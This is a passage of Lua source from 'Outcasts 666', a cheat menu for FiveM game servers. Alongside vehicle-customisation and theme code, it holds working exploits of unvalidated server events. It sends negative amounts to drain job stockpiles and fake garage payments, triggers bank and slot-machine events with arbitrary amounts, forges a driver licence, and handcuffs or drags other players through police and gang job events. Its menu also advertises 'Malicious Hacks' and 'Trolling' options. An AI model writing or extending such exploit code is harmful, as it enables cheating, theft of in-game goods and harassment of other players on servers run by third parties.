                                colorr, colorg, colorb = table.unpack(dA) 
                                r, g, b = GetVehicleNeonLightsColour(veh) 
                                if colorr == r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle, 2) and not b8 then 
                                    pricestring = "Installed"
                                else 
                                    if b8 and colorr == r and colorg == g and colorb == b then 
                                        pricestring = "Previewing"
                                    else 
                                        pricestring = "Not Installed"
                                    end 
                                end
                                if Outcasts666.Button(i, pricestring) then
                                    if not b8 then 
                                        ba = "neon"
                                        bc = IsVehicleNeonLightEnabled(veh, 1) 
                                        oldr, oldg, oldb = GetVehicleNeonLightsColour(veh) 
                                        b9 = table.pack(oldr, oldg, oldb) 
                                        SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) 
                                        SetVehicleNeonLightEnabled(veh, 0, true) 
                                        SetVehicleNeonLightEnabled(veh, 1, true) 
                                        SetVehicleNeonLightEnabled(veh, 2, true) 
                                        SetVehicleNeonLightEnabled(veh, 3, true) 
                                        b8 = true 
                                    elseif b8 and colorr == r and colorg == g and colorb == b then 
                                        SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) 
                                        SetVehicleNeonLightEnabled(veh, 0, true) 
                                        SetVehicleNeonLightEnabled(veh, 1, true) 
                                        SetVehicleNeonLightEnabled(veh, 2, true)
                                        SetVehicleNeonLightEnabled(veh, 3, true) 
                                        b8 = false 
                                        ba = -1 
                                        b9 = -1 
                                    elseif b8 and colorr ~= r or colorg ~= g or colorb ~= b then 
                                        SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) 
                                        SetVehicleNeonLightEnabled(veh, 0, true) 
                                        SetVehicleNeonLightEnabled(veh, 1, true) 
                                        SetVehicleNeonLightEnabled(veh, 2, true)
                                        SetVehicleNeonLightEnabled(veh, 3, true) 
                                        b8 = true 
                                    end 
                                end 
                            end
        
                            Outcasts666.Display() 
                        elseif dA.id == "paint" then
                            if Outcasts666.MenuButton("∑Primary Paint", "primary") then 
                            elseif Outcasts666.MenuButton("∑Secondary Paint", "secondary") then 
                            elseif Outcasts666.MenuButton("∑Wheel Paint", "rimpaint") then 
                            end 
                            Outcasts666.Display()
                        else 
                            local as = checkValidVehicleMods(dA.id) 
                            for dG, dH in pairs(as) do
                                if dH.menuName == "Stock" then 
                                    price = 0 
                                end
                                if dA.name == "Horns" then
                                    for dI, dJ in pairs(horns) do
                                        if dJ ==dG - 1 then 
                                            dH.menuName = dI 
                                        end 
                                    end 
                                end
                                if dH.menuName == "NULL" then 
                                    dH.menuname = "unknown"
                                end
                                if Outcasts666.Button(dH.menuName, price) then
                                    if not b8 then 
                                        ba = dA.id
                                        b9 = GetVehicleMod(veh, dA.id) 
                                        b8 = true
                                        if dH.data.realIndex == -1 then 
                                            bc = "rm"
                                            RemoveVehicleMod(veh, dH.data.modid) 
                                            b8 = false 
                                            ba = -1 
                                            b9 = -1 
                                            bc = false
                                        else 
                                            bc = false 
                                            SetVehicleMod(veh, dA.id, dH.data.realIndex, false) 
                                        end 
                                    elseif b8 and GetVehicleMod(veh, dA.id) == dH.data.realIndex then 
                                        b8 = false 
                                        ba = -1 
                                        b9 = -1 
                                        bc = false
                                        if dH.data.realIndex == -1 then 
                                            RemoveVehicleMod(veh, dH.data.modid)
                                        else 
                                            SetVehicleMod(veh, dA.id, dH.data.realIndex, false) 
                                        end 
                                    elseif b8 and GetVehicleMod(veh, dA.id)  ~= dH.data.realIndex then
                                        if dH.data.realIndex == -1 then 
                                            RemoveVehicleMod(veh, dH.data.modid) 
                                            b8 = false 
                                            ba = -1 
                                            b9 = -1 
                                            bc = false
                                        else 
                                            SetVehicleMod(veh, dA.id, dH.data.realIndex, false) 
                                            b8 = true 
                                        end 
                                    end 
                                end 
                            end 
                                        Outcasts666.Display() 
                        end 
                    end 
                end
    
            for i, dA in pairs(be) do
                if Outcasts666.IsMenuOpened(dA.id) then
                if GetVehicleMod(veh, dA.id) == 0 then pricestock = "Not Installed"
                price1 = "Installed"
                price2 = "Not Installed"
                price3 = "Not Installed"
                price4 = "Not Installed"
                elseif GetVehicleMod(veh, dA.id) == 1 then pricestock = "Not Installed"
                price1 = "Not Installed"
                price2 = "Installed"
                price3 = "Not Installed"
                price4 = "Not Installed"
                elseif GetVehicleMod(veh, dA.id) == 2 then pricestock = "Not Installed"
                price1 = "Not Installed"
                price2 = "Not Installed"
                price3 = "Installed"
                price4 = "Not Installed"
                elseif GetVehicleMod(veh, dA.id) == 3 then pricestock = "Not Installed"
                price1 = "Not Installed"
                price2 = "Not Installed"
                price3 = "Not Installed"
                price4 = "Installed"
                elseif GetVehicleMod(veh, dA.id) == -1 then pricestock = "Installed"
                price1 = "Not Installed"
                price2 = "Not Installed"
                price3 = "Not Installed"
                price4 = "Not Installed"
            end
            if Outcasts666.Button("Stock "..dA.name, pricestock) then 
                SetVehicleMod(veh, dA.id, -1) 
            elseif Outcasts666.Button(dA.name.." Upgrade 1", price1) then 
                SetVehicleMod(veh, dA.id, 0) 
            elseif Outcasts666.Button(dA.name.." Upgrade 2", price2) then 
                SetVehicleMod(veh, dA.id, 1) 
            elseif Outcasts666.Button(dA.name.." Upgrade 3", price3) then 
                SetVehicleMod(veh, dA.id, 2) 
            elseif dA.id ~= 13 and dA.id ~= 12 and Outcasts666.Button(dA.name.." Upgrade 4", price4) then 
                SetVehicleMod(veh, dA.id, 3) end; Outcasts666.Display() 
            end 
        end
    
                if Outcasts666.IsMenuOpened("MainMenu") then
                    drawNotification("Outcasts 666 Created By: OutcastModdingteam Outcast#3723")
                    if Outcasts666.MenuButton("~r~∑~h~~p~Self Menu", "SelfMenu") then
                    elseif Outcasts666.MenuButton("~r~∑~h~~p~Teleport ~r~Menu", "TeleportMenu") then
                    elseif Outcasts666.MenuButton("~r~∑~h~~p~Online ~r~Players", "OnlinePlayersMenu") then
                    elseif Outcasts666.MenuButton("~r~∑~h~~p~Weapon ~r~Menu", "WeaponMenu") then
                    elseif Outcasts666.MenuButton('~r~∑~h~~p~AI ~r~Drive', 'MiscAIDrive') then
                    elseif Outcasts666.MenuButton("~r~∑~h~~p~Vehicle ~r~Menu", "VehMenu") then
					elseif Outcasts666.MenuButton('~r~∑~s~ ~h~~p~Esx ~r~Models', 'MODEL') then
                    elseif Outcasts666.MenuButton("~r~∑~h~~p~Malicious ~r~Hacks", "MaliciousMenu") then
                    elseif Outcasts666.MenuButton("~r~∑~h~~p~Trolling ~r~Options", "TrollMenu") then
                    elseif Outcasts666.MenuButton('~r~∑~h~~p~Drop ~r~Items', 'MiscDrop') then
                    elseif Outcasts666.MenuButton('~r~∑~h~~p~Misc ~r~Triggers', 'MiscTriggers') then
					elseif Outcasts666.MenuButton("~r~∑~h~~p~ESX ~r~Options", "ESXMenu") then
                    elseif Outcasts666.MenuButton("~r~∑~h~~p~VRP ~r~Options", "VRPMenu") then
                    elseif Outcasts666.MenuButton("~r~∑~h~~p~Settings", "SettingsMenu") then
                    elseif Outcasts666.Button("~r~Disable ~r~Menu") then
                        Enabled = false
                    end

					Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("MiscTriggers") then
				    if Outcasts666.Button('~h~~b~Police Handcuff Nearby Player') then
				    TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(nearbyPlayer))
				    elseif Outcasts666.Button('~h~~b~Police Drag Nearby Player') then
				    TriggerServerEvent('esx_policejob:drag', GetPlayerServerId(nearbyPlayer))
				    elseif Outcasts666.Button('~h~~b~Police Put Nearby Player In Car') then
				    TriggerServerEvent('esx_policejob:putInVehicle', GetPlayerServerId(nearbyPlayer))
				    elseif Outcasts666.Button('~h~~b~Police Get Nearby Player out of Car') then
				    TriggerServerEvent('esx_policejob:OutVehicle', GetPlayerServerId(nearbyPlayer))
				    elseif Outcasts666.Button('~h~~b~Mafia Handcuff Nearby Player') then
				    TriggerServerEvent('esx_mafiajob:handcuff', GetPlayerServerId(nearbyPlayer))
				    elseif Outcasts666.Button('~h~~b~Mafia Drag Nearby Player') then
				    TriggerServerEvent('esx_mafiajob:drag', GetPlayerServerId(nearbyPlayer))
				    elseif Outcasts666.Button('~h~~b~Mafia Put Nearby Player In Car') then
				    TriggerServerEvent('esx_mafiajob:putInVehicle', GetPlayerServerId(nearbyPlayer))
				    elseif Outcasts666.Button('~h~~b~Mafia Get Nearby Player out of Car') then
				    TriggerServerEvent('esx_mafiajob:OutVehicle', GetPlayerServerId(nearbyPlayer))
				    elseif Outcasts666.Button('~h~~b~Gang Handcuff Nearby Player') then
				    TriggerServerEvent('esx_gangjob:handcuff', GetPlayerServerId(nearbyPlayer))
				    elseif Outcasts666.Button('~h~~b~Gang Drag Nearby Player') then
				    TriggerServerEvent('esx_gangjob:drag', GetPlayerServerId(nearbyPlayer))
				    elseif Outcasts666.Button('~h~~b~Gang Put Nearby Player In Car') then
				    TriggerServerEvent('esx_gangjob:putInVehicle', GetPlayerServerId(nearbyPlayer))
				    elseif Outcasts666.Button('~h~~b~Gang Get Nearby Player out of Car') then
				    TriggerServerEvent('esx_gangjob:OutVehicle', GetPlayerServerId(nearbyPlayer))
				    elseif Outcasts666.Button('~h~~b~Cartel Nearby Handcuff Player') then
				    TriggerServerEvent('esx_carteljob:handcuff', GetPlayerServerId(nearbyPlayer))
				    elseif Outcasts666.Button('~h~~b~Cartel Nearby Drag Player') then
				    TriggerServerEvent('esx_carteljob:drag', GetPlayerServerId(nearbyPlayer))
				    elseif Outcasts666.Button('~h~~b~Cartel Put Player In Car') then
				    TriggerServerEvent('esx_carteljob:putInVehicle', GetPlayerServerId(nearbyPlayer))
				    elseif Outcasts666.Button('~h~~b~Cartel Get Player out of Car') then
				    TriggerServerEvent('esx_carteljob:OutVehicle', GetPlayerServerId(nearbyPlayer))
			    end
					
	                Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("MiscAIDrive") then
			        if Outcasts666.Button('~h~Config ~g~Your ~h~AI ~o~Speed') then
                    cspeed = KeyboardInput("Enter Wanted MaxSpeed", "", 100)
					local c1 = 1.0
					cspeed = tonumber(cspeed)
					if cspeed == nil then
											drawNotification(
                            '~h~~r~Invalid Speed~s~.'
                        )
                        drawNotification(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    elseif cspeed then
                        aispeed = (cspeed .. ".0")
                        SetDriveTaskMaxCruiseSpeed(GetPlayerPed(-1), tonumber(aispeed))
                    end
					
                    SetDriverAbility(GetPlayerPed(-1), 100.0)
                elseif Outcasts666.Button('~h~Use Your ~g~AI Drive ~h~Slow ~p~Waypoint') then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                        local ped = GetPlayerPed(-1)
                        ClearPedTasks(ped)
                        local v = GetVehiclePedIsIn(ped, false)
                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(aispeed), 156, v, 5, 1.0, true)
                        SetDriveTaskDrivingStyle(ped, 8388636)
                        speedmit = true
                    end
                elseif Outcasts666.Button('~h~Use Your ~g~AI Drive ~h~Fast ~p~Waypoint') then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                        local ped = GetPlayerPed(-1)
                        ClearPedTasks(ped)
                        local v = GetVehiclePedIsIn(ped, false)
                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(aispeed), 156, v, 2883621, 5.5, true)
                        SetDriveTaskDrivingStyle(ped, 2883621)
                        speedmit = true
                    end
                elseif Outcasts666.Button('~h~Use Your ~g~AI Drive ~h~Wander') then
                    local ped = GetPlayerPed(-1)
                    ClearPedTasks(ped)
                    local v = GetVehiclePedIsIn(ped, false)
                    print("Configured speed is currently " .. aispeed)
                    TaskVehicleDriveWander(ped, v, tonumber(aispeed), 8388636)
                elseif Outcasts666.Button('~h~~r~Stop Your ~g~AI Drive') then
                    speedmit = false
                    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                        ClearPedTasks(GetPlayerPed(-1))
                    else
                        ClearPedTasksImmediately(GetPlayerPed(-1))
				    end
			    end
					
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("MiscDrop") then
                    if Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Brinks Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_brinks:getStockItem',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Mechanic Job') then
                    local eu = KeyboardInput('Enter Item Name', '', 100)
                    if eu then
                        local db = KeyboardInput('Enter Amount', '', 100)
                        if db then
                            TriggerServerEvent(
                                'esx_mechanicjob:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Police Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_policejob:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Taxi Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_taxijob:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Unicorn Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_unicornjob:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~VehicleShop') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_vehicleshop:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Admin Tool') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
					local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                        TriggerServerEvent(
						'esx_adminjob:putStockItems', 
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Cartle Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_carteljob:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~MC Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_thelostmcjob:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Gang Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_gangjob:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Bloods Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_bloodsjob:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Lost Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_lostmcjob:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Mafia Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_mafiajob:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Taliban Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_talibanjob:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Ambulance Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_ambulancejob:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Balls Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_ballasjob:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Bishops Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_bishopsjob:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Carthief Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_carthief:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Dismay Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_dismayjob:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Dockshop Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_dockshop:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Fire Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_firejob:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Grove Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_grovejob:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Mecano Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_mecanojob:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Rebem Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_rebeljob:putStockItems',
						a, 
						-b
						)
                        end
                    end
					elseif Outcasts666.Button('~h~Drop Any ~g~Item ~h~From ~o~Vagos Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_vagosjob:putStockItems',
						a, 
						-b
						)
                        end
                    end
				end	
    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("VRPMenu") then
                    if Outcasts666.Button('VRP PayGarage 100$') then
                        TriggerServerEvent('lscustoms:payGarage', {costs = -100})
                    elseif Outcasts666.Button('VRP PayGarage 1000$') then
                        TriggerServerEvent('lscustoms:payGarage', {costs = -1000})
                    elseif Outcasts666.Button('VRP PayGarage 10 000$') then
                        TriggerServerEvent('lscustoms:payGarage', {costs = -10000})
                    elseif Outcasts666.Button('VRP PayGarage 100 000$') then
                        TriggerServerEvent('lscustoms:payGarage', {costs = -100000})
                    elseif Outcasts666.Button('VRP Get Driver Licence') then
                        TriggerServerEvent('dmv:success')
                    elseif Outcasts666.Button('VRP Bank Deposit') then
                        local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                        TriggerServerEvent('bank:deposit', amount)
                    elseif Outcasts666.Button('VRP Bank Whithdraw') then
                        local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                        TriggerServerEvent('bank:withdraw', amount)
                    elseif Outcasts666.Button('VRP Slot Machine') then
                        local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                        TriggerServerEvent('vrp_slotmachine:server:2', amount)
                    end
    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("SettingsMenu") then
                    if Outcasts666.ComboBox("Menu X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
                        currentMenuX = currentIndex
                        selectedMenuX = selectedIndex
                        for i = 0, #allMenus do
                            Outcasts666.SetMenuX(allMenus[i], menuX[currentMenuX])
                        end
                        end) 
                        then
                    elseif Outcasts666.ComboBox("Menu Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
                        currentMenuY = currentIndex
                        selectedMenuY = selectedIndex
                        for i = 0, #allMenus do
                            Outcasts666.SetMenuY(allMenus[i], menuY[currentMenuY])
                        end
                        end)
                        then
                    elseif Outcasts666.CheckBox("Discord Rich Presence", discordPresence, function(enabled) discordPresence = enabled end) then
                    elseif Outcasts666.MenuButton("∑Credits", "Credits") then
                    elseif Outcasts666.MenuButton("∑Themes", "Themes") then
                    elseif Outcasts666.MenuButton("∑Info", "InfoMenu") then
                    end
    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("InfoMenu") then
                    if Outcasts666.Button("Build 0.9") then
                    end
    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("Themes") then
                    if Outcasts666.Button("Original") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                            Outcasts666.SetTitleBackgroundSprite(allMenus[i], "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            Outcasts666.SetSpriteColor(allMenus[i], 255, 0, 0, 255)  
                        end  
                        for i, dA in pairs(bd) do
                            Outcasts666.SetTitleBackgroundSprite(dA.id, "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            Outcasts666.SetSpriteColor(dA.id, 255, 0, 0, 255)  
                        end
                        for i, dA in pairs(be) do 
                            Outcasts666.SetTitleBackgroundSprite(dA.id, "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            Outcasts666.SetSpriteColor(dA.id, 255, 0, 0, 255)
                        end
                    elseif Outcasts666.Button("Original Rainbow") then
                        animated = false
                        rainbow = true
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                            Outcasts666.SetTitleBackgroundSprite(allMenus[i], "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                       end  
                       for i, dA in pairs(bd) do
                           Outcasts666.SetTitleBackgroundSprite(dA.id, "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                       end
                       for i, dA in pairs(be) do 
                           Outcasts666.SetTitleBackgroundSprite(dA.id, "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                       end
                    elseif Outcasts666.Button("Original White") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                             Outcasts666.SetTitleBackgroundSprite(allMenus[i], "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            Outcasts666.SetSpriteColor(allMenus[i], 255, 255, 255, 255)  
                        end  
                        for i, dA in pairs(bd) do
                            Outcasts666.SetTitleBackgroundSprite(dA.id, "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            Outcasts666.SetSpriteColor(dA.id, 255, 255, 255, 255)  
                        end
                        for i, dA in pairs(be) do 
                            Outcasts666.SetTitleBackgroundSprite(dA.id, "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            Outcasts666.SetSpriteColor(dA.id, 255, 255, 255, 255)
                        end
                    elseif Outcasts666.Button("Original Green") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                            Outcasts666.SetTitleBackgroundSprite(allMenus[i], "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            Outcasts666.SetSpriteColor(allMenus[i], 0, 255, 0, 255)  
                        end
                        for i, dA in pairs(bd) do
                            Outcasts666.SetTitleBackgroundSprite(dA.id, "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            Outcasts666.SetSpriteColor(dA.id, 0, 255, 0, 255)  
                        end
                        for i, dA in pairs(be) do 
                            Outcasts666.SetTitleBackgroundSprite(dA.id, "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            Outcasts666.SetSpriteColor(dA.id, 0, 255, 0, 255)
                        end  
                    elseif Outcasts666.Button("Original Blue") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                            Outcasts666.SetTitleBackgroundSprite(allMenus[i], "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            Outcasts666.SetSpriteColor(allMenus[i], 0, 0, 255, 255)  
                        end   
                        for i, dA in pairs(bd) do
                            Outcasts666.SetTitleBackgroundSprite(dA.id, "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            Outcasts666.SetSpriteColor(dA.id, 0, 0, 255, 255)  
                        end
                        for i, dA in pairs(be) do 
                            Outcasts666.SetTitleBackgroundSprite(dA.id, "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            Outcasts666.SetSpriteColor(dA.id, 0, 0, 255, 255)
                        end  
                    elseif Outcasts666.Button("Gradient Black") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                            Outcasts666.SetTitleBackgroundSprite(allMenus[i], "shared", "bggradient_16x512") 
                            Outcasts666.SetSpriteColor(allMenus[i], 0, 0, 255, 255)  
                        end   
                        for i, dA in pairs(bd) do
                            Outcasts666.SetTitleBackgroundSprite(dA.id, "shared", "bggradient_16x512") 
                            Outcasts666.SetSpriteColor(dA.id, 0, 0, 255, 255)  
                        end
                        for i, dA in pairs(be) do 
                            Outcasts666.SetTitleBackgroundSprite(dA.id, "shared", "bggradient_16x512") 
                            Outcasts666.SetSpriteColor(dA.id, 0, 0, 255, 255)
                        end        
                    elseif Outcasts666.Button("Animated") then
                        for i = 0, #allMenus do
                            Outcasts666.SetSpriteColor(allMenus[i], 255, 255, 255, 255)  
                        end
                        rainbow = false     
                        animated = true                          
                    elseif Outcasts666.Button("God") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                            Outcasts666.SetTitleBackgroundSprite(allMenus[i], "assassinations", "target1") 
                            Outcasts666.SetSpriteColor(allMenus[i], 255, 255, 255, 255)  
                        end
                        for i, dA in pairs(bd) do
                            Outcasts666.SetTitleBackgroundSprite(dA.id, "assassinations", "target1") 
                            Outcasts666.SetSpriteColor(dA.id, 255, 255, 255, 255)  
                        end
                        for i, dA in pairs(be) do 
                            Outcasts666.SetTitleBackgroundSprite(dA.id, "assassinations", "target1") 
                            Outcasts666.SetSpriteColor(dA.id, 255, 255, 255, 255)
                        end     
                    elseif Outcasts666.Button("God2") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                            Outcasts666.SetTitleBackgroundSprite(allMenus[i], "assassinations", "target3") 
                            Outcasts666.SetSpriteColor(allMenus[i], 255, 255, 255, 255)  
                        end
                        for i, dA in pairs(bd) do
                            Outcasts666.SetTitleBackgroundSprite(dA.id, "assassinations", "target3") 
                            Outcasts666.SetSpriteColor(dA.id, 255, 255, 255, 255)  
                        end
                        for i, dA in pairs(be) do 
                            Outcasts666.SetTitleBackgroundSprite(dA.id, "assassinations", "target3") 
                            Outcasts666.SetSpriteColor(dA.id, 255, 255, 255, 255)
                        end     
                    end
    
    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("Credits") then
                    if Outcasts666.Button("Outcasts 666 Created By: OutcastModdingteam Outcast#3723") then
                    end
    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("WeaponTypes") then
                    for e0, ev in pairs(b7) do
                        if Outcasts666.MenuButton("∑"..e0, "WeaponTypeSelection") then 
                            dy = ev 
                        end 
                    end 
    
                    Outcasts666.Display() 
                            elseif Outcasts666.IsMenuOpened("WeaponTypeSelection") then
                                for e0, ev in pairs(dy) do
                                    if Outcasts666.MenuButton(ev.name, "WeaponOptions") then 
                                        dz = ev 
                                    end
